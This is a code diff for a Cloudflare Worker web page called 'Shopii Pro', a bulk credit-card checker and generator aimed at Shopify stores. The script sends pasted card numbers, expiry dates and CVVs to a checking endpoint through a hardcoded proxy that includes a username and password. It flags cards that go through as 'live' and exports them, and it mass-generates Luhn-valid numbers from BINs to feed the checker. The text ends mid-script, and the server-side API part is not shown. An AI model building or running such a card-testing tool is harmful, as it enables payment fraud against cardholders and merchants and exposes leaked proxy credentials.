@@ -1,0 +1,617 @@
+// Shopii Pro - Complete Worker (HTML + API)
+// Deploy as Cloudflare Worker
+
+const HTML = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopii Pro - Premium Card Checker & Generator</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        :root{--bg-primary:#0a0a0f;--bg-secondary:#12121a;--bg-tertiary:#1a1a25;--bg-card:#16161f;--border-color:#2a2a3a;--text-primary:#fff;--text-secondary:#8b8b9e;--text-muted:#5a5a6e;--accent-primary:#6c5ce7;--accent-secondary:#a29bfe;--accent-gradient:linear-gradient(135deg,#6c5ce7 0%,#a29bfe 100%);--success:#00b894;--error:#e17055;--warning:#fdcb6e;--info:#74b9ff}
+        body{font-family:'Inter',sans-serif;background:var(--bg-primary);color:var(--text-primary);min-height:100vh}
+        .bg-animation{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;background:var(--bg-primary);overflow:hidden}
+        .bg-animation::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 20% 80%,rgba(108,92,231,.08) 0%,transparent 50%),radial-gradient(circle at 80% 20%,rgba(162,155,254,.06) 0%,transparent 50%);animation:bgFloat 20s ease-in-out infinite}
+        @keyframes bgFloat{0%,100%{transform:translate(0,0) rotate(0)}33%{transform:translate(30px,-30px) rotate(5deg)}66%{transform:translate(-20px,20px) rotate(-5deg)}}
+        .header{padding:20px 40px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--border-color);backdrop-filter:blur(10px);background:rgba(10,10,15,.8);position:sticky;top:0;z-index:100}
+        .logo{display:flex;align-items:center;gap:12px}
+        .logo-icon{width:42px;height:42px;background:var(--accent-gradient);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:800;color:#fff;box-shadow:0 4px 15px rgba(108,92,231,.4)}
+        .logo-text{font-size:24px;font-weight:800;background:var(--accent-gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+        .badge{font-size:10px;padding:3px 8px;background:rgba(108,92,231,.2);border:1px solid var(--accent-primary);border-radius:20px;color:var(--accent-secondary);margin-left:8px;vertical-align:super}
+        .header-stats{display:flex;gap:24px}
+        .stat-item{text-align:center;padding:8px 16px;background:var(--bg-card);border-radius:10px;border:1px solid var(--border-color)}
+        .stat-value{font-size:18px;font-weight:700;font-family:'JetBrains Mono',monospace}
+        .stat-label{font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px}
+        .stat-value.success{color:var(--success)}.stat-value.error{color:var(--error)}.stat-value.total{color:var(--info)}
+        .container{max-width:1500px;margin:0 auto;padding:40px}
+        .tabs{display:flex;gap:8px;margin-bottom:30px;background:var(--bg-card);padding:8px;border-radius:14px;width:fit-content}
+        .tab-btn{padding:12px 28px;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;transition:all .3s ease;background:transparent;color:var(--text-muted)}
+        .tab-btn.active{background:var(--accent-gradient);color:#fff;box-shadow:0 4px 15px rgba(108,92,231,.4)}
+        .tab-btn:hover:not(.active){background:var(--bg-tertiary);color:var(--text-primary)}
+        .tab-content{display:none}.tab-content.active{display:block}
+        .main-grid{display:grid;grid-template-columns:1fr 380px;gap:30px}
+        .card{background:var(--bg-card);border:1px solid var(--border-color);border-radius:16px;padding:28px;transition:all .3s ease}
+        .card:hover{border-color:rgba(108,92,231,.3);box-shadow:0 8px 32px rgba(0,0,0,.3)}
+        .card-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px}
+        .card-title{font-size:16px;font-weight:600;display:flex;align-items:center;gap:10px}
+        .card-title-icon{width:32px;height:32px;background:rgba(108,92,231,.15);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:14px}
+        .input-section{margin-bottom:24px}.input-group{margin-bottom:16px}
+        .input-label{display:block;font-size:13px;font-weight:500;color:var(--text-secondary);margin-bottom:8px}
+        .site-input,.cards-textarea,.bin-input,.qty-input{width:100%;padding:14px 18px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:12px;color:var(--text-primary);font-family:'JetBrains Mono',monospace;font-size:14px;transition:all .3s ease;resize:none}
+        .site-input:focus,.cards-textarea:focus,.bin-input:focus,.qty-input:focus{outline:none;border-color:var(--accent-primary);box-shadow:0 0 0 3px rgba(108,92,231,.15)}
+        .cards-textarea{min-height:300px;line-height:1.8}
+        .cards-textarea::placeholder{color:var(--text-muted);font-family:'Inter',sans-serif}
+        .input-hint{display:flex;justify-content:space-between;align-items:center;margin-top:8px;font-size:12px;color:var(--text-muted)}
+        .card-count{background:var(--bg-tertiary);padding:4px 10px;border-radius:6px;font-family:'JetBrains Mono',monospace;color:var(--accent-secondary)}
+        .btn-group{display:flex;gap:12px;margin-top:20px}
+        .btn{flex:1;padding:14px 24px;border:none;border-radius:12px;font-size:14px;font-weight:600;cursor:pointer;transition:all .3s ease;display:flex;align-items:center;justify-content:center;gap:8px}
+        .btn-primary{background:var(--accent-gradient);color:#fff;box-shadow:0 4px 15px rgba(108,92,231,.4)}
+        .btn-primary:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 6px 25px rgba(108,92,231,.5)}
+        .btn-primary:disabled{opacity:.6;cursor:not-allowed}
+        .btn-secondary{background:var(--bg-tertiary);color:var(--text-secondary);border:1px solid var(--border-color)}
+        .btn-secondary:hover{background:var(--border-color);color:var(--text-primary)}
+        .btn-success{background:linear-gradient(135deg,#00b894 0%,#00cec9 100%);color:#fff;box-shadow:0 4px 15px rgba(0,184,148,.4)}
+        .btn-success:hover{transform:translateY(-2px);box-shadow:0 6px 25px rgba(0,184,148,.5)}
+        .progress-section{margin-top:24px;display:none}.progress-section.active{display:block}
+        .progress-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+        .progress-title{font-size:14px;font-weight:600;color:var(--text-secondary)}
+        .progress-percentage{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--accent-secondary)}
+        .progress-bar-container{height:8px;background:var(--bg-tertiary);border-radius:4px;overflow:hidden}
+        .progress-bar{height:100%;background:var(--accent-gradient);border-radius:4px;transition:width .3s ease;width:0}
+        .progress-details{display:flex;gap:20px;margin-top:12px;font-size:12px;color:var(--text-muted)}
+        .sidebar{display:flex;flex-direction:column;gap:20px}
+        .settings-item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid var(--border-color)}
+        .settings-item:last-child{border-bottom:none}
+        .settings-label{font-size:13px;color:var(--text-secondary)}
+        .settings-value{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--accent-secondary);background:var(--bg-tertiary);padding:4px 10px;border-radius:6px}
+        .results-section{margin-top:30px}
+        .results-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+        .results-title{font-size:20px;font-weight:700}
+        .results-actions{display:flex;gap:10px}
+        .btn-sm{padding:8px 16px;font-size:12px;border-radius:8px;background:var(--bg-tertiary);border:1px solid var(--border-color);color:var(--text-secondary);cursor:pointer;transition:all .2s ease}
+        .btn-sm:hover{background:var(--border-color);color:var(--text-primary)}
+        .table-container{overflow-x:auto;border-radius:12px;border:1px solid var(--border-color);max-height:500px;overflow-y:auto}
+        table{width:100%;border-collapse:collapse}
+        th,td{padding:14px 18px;text-align:left;font-size:13px}
+        th{background:var(--bg-tertiary);font-weight:600;color:var(--text-secondary);text-transform:uppercase;font-size:11px;letter-spacing:.5px;position:sticky;top:0;z-index:10}
+        td{border-bottom:1px solid var(--border-color);font-family:'JetBrains Mono',monospace;font-size:12px}
+        tr:last-child td{border-bottom:none}tr:hover td{background:rgba(108,92,231,.05)}
+        .status-badge{display:inline-flex;align-items:center;gap:6px;padding:5px 12px;border-radius:20px;font-size:11px;font-weight:600;font-family:'Inter',sans-serif}
+        .status-live{background:rgba(0,184,148,.15);color:var(--success);border:1px solid rgba(0,184,148,.3)}
+        .status-dead{background:rgba(225,112,85,.15);color:var(--error);border:1px solid rgba(225,112,85,.3)}
+        .status-checking{background:rgba(253,203,110,.15);color:var(--warning);border:1px solid rgba(253,203,110,.3)}
+        .status-dot{width:6px;height:6px;border-radius:50%;background:currentColor}
+        .cc-masked{color:var(--text-muted)}
+        .format-info{background:var(--bg-tertiary);border-radius:10px;padding:16px;margin-top:16px}
+        .format-title{font-size:12px;font-weight:600;color:var(--text-muted);margin-bottom:10px;text-transform:uppercase;letter-spacing:.5px}
+        .format-example{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--accent-secondary);background:var(--bg-primary);padding:10px 14px;border-radius:8px;border-left:3px solid var(--accent-primary);line-height:1.8}
+        .generator-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px}
+        .generator-output{background:var(--bg-tertiary);border-radius:12px;padding:16px;margin-top:16px;max-height:300px;overflow-y:auto}
+        .generator-output-text{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--accent-secondary);line-height:1.8;white-space:pre-wrap;word-break:break-all}
+        @media(max-width:1200px){.main-grid{grid-template-columns:1fr}.sidebar{order:2}.generator-grid{grid-template-columns:1fr}}
+        @media(max-width:1024px){.header-stats{display:none}.container{padding:20px}}
+        .spinner{width:18px;height:18px;border:2px solid transparent;border-top-color:currentColor;border-radius:50%;animation:spin .8s linear infinite}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .toast-container{position:fixed;top:20px;right:20px;z-index:1000;display:flex;flex-direction:column;gap:10px}
+        .toast{padding:14px 20px;border-radius:10px;background:var(--bg-card);border:1px solid var(--border-color);box-shadow:0 8px 32px rgba(0,0,0,.4);display:flex;align-items:center;gap:10px;animation:slideIn .3s ease;max-width:400px}
+        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
+        .toast.success{border-left:3px solid var(--success)}.toast.error{border-left:3px solid var(--error)}.toast.info{border-left:3px solid var(--info)}
+        .gen-stats{display:flex;gap:12px;margin-top:12px;flex-wrap:wrap}
+        .gen-stat{background:var(--bg-tertiary);padding:8px 14px;border-radius:8px;font-size:12px}
+        .gen-stat-label{color:var(--text-muted);font-size:10px;text-transform:uppercase}
+        .gen-stat-value{font-family:'JetBrains Mono',monospace;font-weight:600;color:var(--accent-secondary)}
+    </style>
+</head>
+<body>
+<div class="bg-animation"></div>
+<div class="toast-container" id="toastContainer"></div>
+
+<header class="header">
+    <div class="logo"><div class="logo-icon">S</div><span class="logo-text">Shopii<span class="badge">PRO</span></span></div>
+    <div class="header-stats">
+        <div class="stat-item"><div class="stat-value total" id="totalChecked">0</div><div class="stat-label">Total</div></div>
+        <div class="stat-item"><div class="stat-value success" id="liveCount">0</div><div class="stat-label">Live ✅</div></div>
+        <div class="stat-item"><div class="stat-value error" id="deadCount">0</div><div class="stat-label">Dead ❌</div></div>
+    </div>
+</header>
+
+<main class="container">
+    <div class="tabs">
+        <button class="tab-btn active" onclick="switchTab('checker')">🔍 Card Checker</button>
+        <button class="tab-btn" onclick="switchTab('generator')">🎲 CC Generator</button>
+    </div>
+
+    <div id="checker-tab" class="tab-content active">
+        <div class="main-grid">
+            <div class="left-panel">
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title"><span class="card-title-icon">🛒</span>Bulk Card Checker</h2>
+                    </div>
+                    <div class="input-section">
+                        <div class="input-group">
+                            <label class="input-label">Target Shopify Site URL</label>
+                            <input type="text" class="site-input" id="siteInput" placeholder="https://example-store.myshopify.com" value="https://artpop.com">
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label">Credit Cards (One per line - Paste bulk cards here)</label>
+                            <textarea class="cards-textarea" id="cardsInput" placeholder="Paste your cards here... One card per line&#10;&#10;Supported formats:&#10;5455122802569146|12|26|543&#10;5455 1228 0256 9146|12/26|543&#10;5455122802569146 12 26 543"></textarea>
+                            <div class="input-hint">
+                                <span>Format: CC | MM/YY | CVV (auto-detected)</span>
+                                <span class="card-count"><span id="cardCount">0</span> cards loaded</span>
+                            </div>
+                        </div>
+                        <div class="format-info">
+                            <div class="format-title">✅ All These Formats Work Automatically:</div>
+                            <div class="format-example">
+                                5455122802569146|12|26|543<br>
+                                5455122802569146|12/26|543<br>
+                                5455 1228 0256 9146|12|26|543<br>
+                                5455122802569146 12 26 543<br>
+                                5455122802569146 12/26 543
+                            </div>
+                        </div>
+                    </div>
+                    <div class="btn-group">
+                        <button class="btn btn-primary" id="startBtn" onclick="startChecking()">⚡ Start Checking</button>
+                        <button class="btn btn-secondary" onclick="clearAll()">🗑️ Clear All</button>
+                        <button class="btn btn-success" onclick="switchTab('generator')">🎲 Generate Cards</button>
+                    </div>
+                    <div class="progress-section" id="progressSection">
+                        <div class="progress-header"><span class="progress-title">⏳ Processing cards...</span><span class="progress-percentage" id="progressPercent">0%</span></div>
+                        <div class="progress-bar-container"><div class="progress-bar" id="progressBar"></div></div>
+                        <div class="progress-details">
+                            <span><span id="processedCount">0</span> / <span id="totalCount">0</span> processed</span>
+                            <span style="color:var(--success)">✅ <span id="liveProgress">0</span> Live</span>
+                            <span style="color:var(--error)">❌ <span id="deadProgress">0</span> Dead</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="sidebar">
+                <div class="card">
+                    <div class="card-header"><h2 class="card-title"><span class="card-title-icon">⚙️</span>Configuration</h2></div>
+                    <div class="settings-item"><span class="settings-label">API Status</span><span class="settings-value" style="color:var(--success)">● Online</span></div>
+                    <div class="settings-item"><span class="settings-label">Proxy</span><span class="settings-value">Connected</span></div>
+                    <div class="settings-item"><span class="settings-label">Gateway</span><span class="settings-value">Shopify Payments</span></div>
+                    <div class="settings-item"><span class="settings-label">Timeout</span><span class="settings-value">30 seconds</span></div>
+                </div>
+                <div class="card">
+                    <div class="card-header"><h2 class="card-title"><span class="card-title-icon">📊</span>Session Stats</h2></div>
+                    <div class="settings-item"><span class="settings-label">Success Rate</span><span class="settings-value" id="successRate">0%</span></div>
+                    <div class="settings-item"><span class="settings-label">Avg Response</span><span class="settings-value" id="avgResponse">--ms</span></div>
+                    <div class="settings-item"><span class="settings-label">Elapsed Time</span><span class="settings-value" id="sessionTime">00:00</span></div>
+                </div>
+            </div>
+        </div>
+        
+        <section class="results-section" id="resultsSection" style="display:none">
+            <div class="results-header">
+                <h2 class="results-title">📋 Check Results</h2>
+                <div class="results-actions">
+                    <button class="btn-sm" onclick="filterResults('all')">All (<span id="filterAll">0</span>)</button>
+                    <button class="btn-sm" onclick="filterResults('live')" style="color:var(--success)">✅ Live (<span id="filterLive">0</span>)</button>
+                    <button class="btn-sm" onclick="filterResults('dead')" style="color:var(--error)">❌ Dead (<span id="filterDead">0</span>)</button>
+                    <button class="btn-sm" onclick="exportResults()">📥 Export CSV</button>
+                    <button class="btn-sm" onclick="copyLiveCards()" style="background:rgba(0,184,148,.2);color:var(--success)">📋 Copy Live</button>
+                </div>
+            </div>
+            <div class="table-container">
+                <table><thead><tr><th>#</th><th>Card Number</th><th>Status</th><th>Response</th><th>Gateway</th><th>Price</th><th>Time</th></tr></thead><tbody id="resultsBody"></tbody></table>
+            </div>
+        </section>
+    </div>
+
+    <div id="generator-tab" class="tab-content">
+        <div class="main-grid">
+            <div class="left-panel">
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title"><span class="card-title-icon">🎲</span>Credit Card Generator</h2>
+                    </div>
+                    <div class="input-section">
+                        <div class="generator-grid">
+                            <div class="input-group">
+                                <label class="input-label">BIN / IIN (First 6 digits)</label>
+                                <input type="text" class="bin-input" id="binInput" placeholder="545512" maxlength="8" value="545512">
+                                <div class="input-hint"><span>e.g., 545512 for Mastercard</span></div>
+                            </div>
+                            <div class="input-group">
+                                <label class="input-label">Quantity to Generate</label>
+                                <input type="number" class="qty-input" id="qtyInput" placeholder="100" min="1" max="100000" value="1000">
+                                <div class="input-hint"><span>Max: 100,000 cards</span></div>
+                            </div>
+                        </div>
+                        
+                        <div class="btn-group">
+                            <button class="btn btn-success" onclick="generateCards()" id="genBtn">🎲 Generate Cards</button>
+                            <button class="btn btn-primary" onclick="copyGeneratedCards()">📋 Copy All</button>
+                            <button class="btn btn-secondary" onclick="sendToChecker()">➡️ Send to Checker</button>
+                        </div>
+                        
+                        <div class="generator-output" id="genOutput" style="display:none">
+                            <div class="format-title">Generated Cards (<span id="genCount">0</span>)</div>
+                            <pre class="generator-output-text" id="genOutputText"></pre>
+                        </div>
+                        
+                        <div class="gen-stats" id="genStats" style="display:none">
+                            <div class="gen-stat"><div class="gen-stat-label">Total Generated</div><div class="gen-stat-value" id="genStatTotal">0</div></div>
+                            <div class="gen-stat"><div class="gen-stat-label">Card Type</div><div class="gen-stat-value" id="genStatType">-</div></div>
+                            <div class="gen-stat"><div class="gen-stat-label">Format</div><div class="gen-stat-value">CC|MM|YY|CVV</div></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card" style="margin-top:20px">
+                    <div class="card-header">
+                        <h2 class="card-title"><span class="card-title-icon">💡</span>Popular BINs</h2>
+                    </div>
+                    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px">
+                        <button class="btn-sm" onclick="setBIN('545512','Mastercard')" style="text-align:left">💳 Mastercard - 545512</button>
+                        <button class="btn-sm" onclick="setBIN('411111','Visa')" style="text-align:left">💳 Visa Test - 411111</button>
+                        <button class="btn-sm" onclick="setBIN('550000','Mastercard')" style="text-align:left">💳 Mastercard Debit - 550000</button>
+                        <button class="btn-sm" onclick="setBIN('378282','Amex')" style="text-align:left">💳 Amex - 378282</button>
+                        <button class="btn-sm" onclick="setBIN('601111','Discover')" style="text-align:left">💳 Discover - 601111</button>
+                        <button class="btn-sm" onclick='setBIN("353011","JCB")' style="text-align:left">💳 JCB - 353011</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="sidebar">
+                <div class="card">
+                    <div class="card-header"><h2 class="card-title"><span class="card-title-icon">ℹ️</span>How It Works</h2></div>
+                    <div style="font-size:13px;color:var(--text-secondary);line-height:1.8">
+                        <p><strong>Step 1:</strong> Enter a 6-digit BIN</p>
+                        <p><strong>Step 2:</strong> Set quantity (1-100K)</p>
+                        <p><strong>Step 3:</strong> Click Generate</p>
+                        <p><strong>Step 4:</strong> Copy or Send to Checker</p>
+                        <br>
+                        <p style="color:var(--text-muted);font-size:12px">Generated cards use Luhn algorithm for valid checksums.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</main>
+
+<script>
+(function(){
+    var results=[],isChecking=false,sessionStartTime=null,sessionTimer=null;
+    var generatedCards=[];
+    var PROXY='px014236.pointtoserver.com:10780:purevpn0s11127688:4mwmyaoa';
+    
+    window.switchTab=function(tab){
+        document.querySelectorAll('.tab-btn').forEach(function(b){b.classList.remove('active')});
+        document.querySelectorAll('.tab-content').forEach(function(c){c.classList.remove('active')});
+        if(tab==='checker'){document.querySelectorAll('.tab-btn')[0].classList.add('active');document.getElementById('checker-tab').classList.add('active')}
+        else{document.querySelectorAll('.tab-btn')[1].classList.add('active');document.getElementById('generator-tab').classList.add('active')}
+    };
+    
+    function parseCards(input){
+        if(!input.trim())return[];
+        var lines=input.split('\\n'),cards=[],errors=0;
+        for(var i=0;i<lines.length;i++){
+            var line=lines[i].trim();if(!line)continue;
+            line=line.replace(/\\s+/g,' ').replace(/\\//g,'|').replace(/-/g,'');
+            var parts=line.split('|'),card=null;
+            if(parts.length>=4){
+                var cc=parts[0].replace(/\\s/g,'');
+                if(/^\\d{13,19}$/.test(cc))card={cc:cc,mm:parts[1].trim().padStart(2,'0'),yy:parts[2].trim(),cvv:parts[3].trim()};
+            }else if(parts.length===3){
+                var cc=parts[0].replace(/\\s/g,'');
+                if(/^\\d{13,19}$/.test(cc)&&/\\d{4}/.test(parts[1]))card={cc:cc,mm:parts[1].substring(0,2),yy:parts[1].substring(2,4),cvv:parts[2].trim()};
+            }else if(/^\\d{13,19}$/.test(line.replace(/\\s/g,''))){
+                var cc=line.replace(/\\s/g,'');
+                card={cc:cc,mm:String(Math.floor(Math.random()*12)+1).padStart(2,'0'),yy:String(new Date().getFullYear()+Math.floor(Math.random()*5)).substring(2),cvv:String(Math.floor(Math.random()*900)+100)};
+            }
+            if(card)cards.push(card);else errors++;
+        }
+        return cards;
+    }
+    
+    document.getElementById('cardsInput').addEventListener('input',function(){
+        var c=parseCards(this.value).length;
+        document.getElementById('cardCount').textContent=c;
+        document.getElementById('cardCount').style.color=c>0?'var(--success)':'var(--accent-secondary)';
+    });
+    
+    window.startChecking=async function(){
+        var site=document.getElementById('siteInput').value.trim();
+        var cards=parseCards(document.getElementById('cardsInput').value);
+        if(!site){showToast('Please enter a target site URL','error');return}
+        if(!site.startsWith('http')){showToast('URL must start with http:// or https://','error');return}
+        if(cards.length===0){showToast('No valid cards found! Check format.','error');return}
+        if(isChecking)return;
+        
+        isChecking=true;results=[];sessionStartTime=Date.now();
+        document.getElementById('startBtn').disabled=true;
+        document.getElementById('startBtn').innerHTML='<span class="spinner"></span> Checking...';
+        document.getElementById('progressSection').classList.add('active');
+        document.getElementById('resultsSection').style.display='block';
+        document.getElementById('totalCount').textContent=cards.length;
+        sessionTimer=setInterval(updateSessionTime,1000);
+        
+        var live=0,dead=0;
+        for(var i=0;i<cards.length;i++){
+            var card=cards[i],ccStr=card.cc+'|'+card.mm+'|'+card.yy+'|'+card.cvv;
+            try{
+                addRow({index:i+1,card:maskCard(card.cc),fullCard:ccStr,status:'checking',response:'Checking...',gateway:'-',price:'-',time:'-'});
+                var start=Date.now();
+                var response=await fetch('/api/check?site='+encodeURIComponent(site)+'&cc='+encodeURIComponent(ccStr)+'&proxy='+encodeURIComponent(PROXY));
+                var data=await response.json();
+                var elapsed=Date.now()-start;
+                var result={index:i+1,card:maskCard(card.cc),fullCard:ccStr,status:(data.Status==='Approved'||data.Response==='APPROVED')?'live':'dead',response:data.Response||data.RawResponse||'Unknown',gateway:data.Gateway||'N/A',price:data.Price||'N/A',time:elapsed+'ms'};
+                results.push(result);
+                if(result.status==='live')live++;else dead++;
+                updateLastRow(result);
+            }catch(e){
+                console.error(e);
+                var result={index:i+1,card:maskCard(card.cc),fullCard:ccStr,status:'dead',response:'Connection Error',gateway:'N/A',price:'N/A',time:'-'};
+                results.push(result);dead++;updateLastRow(result);
+            }
+            var progress=Math.round(((i+1)/cards.length)*100);
+            document.getElementById('progressBar').style.width=progress+'%';
+            document.getElementById('progressPercent').textContent=progress+'%';
+            document.getElementById('processedCount').textContent=i+1;
+            document.getElementById('liveProgress').textContent=live;
+            document.getElementById('deadProgress').textContent=dead;
+            updateStats(live,dead,results.length);
+            updateFilterCounts(live,dead,results.length);
+            await new Promise(function(r){setTimeout(r,300)});
+        }
+        finishChecking(live,dead);
+    };
+    
+    function addRow(r){
+        var tb=document.getElementById('resultsBody'),row=document.createElement('tr');
+        row.id='row-'+r.index;
+        row.innerHTML='<td>'+r.index+'</td><td class="cc-masked">'+r.card+'</td><td>'+getBadge(r.status)+'</td><td>'+r.response+'</td><td>'+r.gateway+'</td><td>'+r.price+'</td><td>'+r.time+'</td>';
+        tb.appendChild(row);
+        document.querySelector('.table-container').scrollTop=document.querySelector('.table-container').scrollHeight;
+    }
+    
+    function updateLastRow(r){
+        var row=document.getElementById('row-'+r.index);
+        if(row)row.innerHTML='<td>'+r.index+'</td><td class="cc-masked">'+r.card+'</td><td>'+getBadge(r.status)+'</td><td>'+r.response+'</td><td>'+r.gateway+'</td><td>'+r.price+'</td><td>'+r.time+'</td>';
+    }
+    
+    function getBadge(s){var o={live:'✅ LIVE',dead:'❌ DEAD',checking:'⏳ CHECKING'};return '<span class="status-badge status-'+s+'"><span class="status-dot"></span>'+(o[s]||s.toUpperCase())+'</span>';}
+    
+    function maskCard(cc){return cc.length<=8?cc:cc.substring(0,4)+' **** **** '+cc.substring(cc.length-4);}
+    
+    function updateStats(l,d,t){
+        document.getElementById('totalChecked').textContent=t;
+        document.getElementById('liveCount').textContent=l;
+        document.getElementById('deadCount').textContent=d;
+        document.getElementById('successRate').textContent=t?Math.round((l/t)*100)+'%':'0%';
+        var ts=results.filter(function(r){return r.time!=='-'&&r.time!=='--'}).map(function(r){return parseInt(r.time)});
+        if(ts.length)document.getElementById('avgResponse').textContent=Math.round(ts.reduce(function(a,b){return a+b},0)/ts.length)+'ms';
+    }
+    
+    function updateFilterCounts(l,d,t){
+        document.getElementById('filterAll').textContent=t;
+        document.getElementById('filterLive').textContent=l;
+        document.getElementById('filterDead').textContent=d;
+    }
+    
+    function updateSessionTime(){
+        if(!sessionStartTime)return;
+        var e=Math.floor((Date.now()-sessionStartTime)/1000);
+        document.getElementById('sessionTime').textContent=String(Math.floor(e/60)).padStart(2,'0')+':'+String(e%60).padStart(2,'0');
+    }
+    
+    function finishChecking(l,d){
+        isChecking=false;clearInterval(sessionTimer);
+        document.getElementById('startBtn').disabled=false;
+        document.getElementById('startBtn').innerHTML='⚡ Start Checking';
+        showToast('✅ Complete! '+l+' Live, '+d+' Dead',l>0?'success':'info');
+    }
+    
+    window.filterResults=function(f){
+        document.querySelectorAll('#resultsBody tr').forEach(function(row){
+            var b=row.querySelector('.status-badge');if(!b)return;
+            var s=b.classList.contains('status-live')?'live':b.classList.contains('status-checking')?'checking':'dead';
+            row.style.display=(f==='all'||f===s)?'':'none';
+        });
+    };
+    
+    window.exportResults=function(){
+        if(!results.length){showToast('No results to export','error');return}
+        var csv='#,Card,Status,Response,Gateway,Price,Time\\n';
+        results.forEach(function(r){csv+=r.index+','+r.fullCard+','+r.status.toUpperCase()+','+r.response+','+r.gateway+','+r.price+','+r.time+'\\n'});
+        download(csv,'shopii-results-'+Date.now()+'.csv','text/csv');
+        showToast('📥 Exported!','success');
+    };
+    
+    window.copyLiveCards=function(){
+        var live=results.filter(function(r){return r.status==='live'}).map(function(r){return r.fullCard});
+        if(!live.length){showToast('No live cards','error');return}
+        navigator.clipboard.writeText(live.join('\\n')).then(function(){showToast('📋 Copied '+live.length+'!','success')});
+    };
+    
+    window.clearAll=function(){
+        if(isChecking)return;
+        document.getElementById('cardsInput').value='';
+        document.getElementById('cardCount').textContent='0';
+        document.getElementById('resultsBody').innerHTML='';
+        document.getElementById('resultsSection').style.display='none';
+        document.getElementById('progressSection').classList.remove('active');
+        document.getElementById('progressBar').style.width='0%';
+        results=[];updateStats(0,0,0);updateFilterCounts(0,0,0);
+        document.getElementById('successRate').textContent='0%';
+        document.getElementById('avgResponse').textContent='--ms';
+        document.getElementById('sessionTime').textContent='00:00';
+        showToast('Cleared!','info');
+    };
+    
+    function luhnCheck(num){
+        var arr=(num+'').split('').reverse().map(function(x){return parseInt(x)});
+        return arr.reduce(function(acc,val,i){if(i%2!==0){val*=2;if(val>9)val-=9}return acc+val},0)%10===0;
+    }
+    
+    function generateLuhn(prefix,length){
+        prefix=String(prefix);length=length||16;
+        while(prefix.length<length-1)prefix+=String(Math.floor(Math.random()*10));
+        var sum=0,digits=prefix.split('').reverse().map(function(x){return parseInt(x)});
+        for(var i=0;i<digits.length;i++){var d=digits[i];if(i%2===0){d*=2;if(d>9)d-=9}sum+=d}
+        return prefix+(10-(sum%10))%10;
+    }
+    
+    function getCardType(bin){
+        bin=String(bin);
+        if(/^4/.test(bin))return'Visa';
+        if(/^5[1-5]/.test(bin)||/^2[2-7]/.test(bin))return'Mastercard';
+        if(/^3[47]/.test(bin))return'Amex';
+        if(/^6(?:011|5)/.test(bin))return'Discover';
+        if(/^35/.test(bin))return'JCB';
+        return'Unknown';
+    }
+    
+    window.generateCards=function(){
+        var bin=document.getElementById('binInput').value.replace(/\\D/g,'');
+        var qty=parseInt(document.getElementById('qtyInput').value)||100;
+        if(bin.length<4){showToast('Enter at least 4-digit BIN','error');return}
+        if(qty<1||qty>100000){showToast('Quantity must be 1-100,000','error');return}
+        
+        var type=getCardType(bin),cardLength=type==='Amex'?15:16;
+        generatedCards=[];
+        
+        var btn=document.getElementById('genBtn');
+        btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Generating...';
+        
+        setTimeout(function(){
+            for(var i=0;i<qty;i++){
+                var cc=generateLuhn(bin,cardLength);
+                var mm=String(Math.floor(Math.random()*12)+1).padStart(2,'0');
+                var yy=String(Math.floor(Math.random()*5)+27).padStart(2,'0');
+                var cvv=String(Math.floor(Math.random()*900)+100);
+                generatedCards.push(cc+'|'+mm+'|'+yy+'|'+cvv);
+            }
+            
+            document.getElementById('genOutput').style.display='block';
+            document.getElementById('genStats').style.display='flex';
+            document.getElementById('genOutputText').textContent=generatedCards.join('\\n');
+            document.getElementById('genCount').textContent=generatedCards.length.toLocaleString();
+            document.getElementById('genStatTotal').textContent=generatedCards.length.toLocaleString();
+            document.getElementById('genStatType').textContent=type;
+            
+            btn.disabled=false;btn.innerHTML='🎲 Generate Cards';
+            showToast('✅ Generated '+generatedCards.length.toLocaleString()+' cards!','success');
+        },100);
+    };
+    
+    window.copyGeneratedCards=function(){
+        if(!generatedCards.length){showToast('Generate cards first!','error');return}
+        navigator.clipboard.writeText(generatedCards.join('\\n')).then(function(){showToast('📋 Copied '+generatedCards.length+'!','success')});
+    };
+    
+    window.sendToChecker=function(){
+        if(!generatedCards.length){showToast('Generate cards first!','error');return}
+        document.getElementById('cardsInput').value=generatedCards.join('\\n');
+        document.getElementById('cardCount').textContent=generatedCards.length;
+        switchTab('checker');
+        showToast('➡️ Sent to checker! Click "Start Checking"','info');
+    };
+    
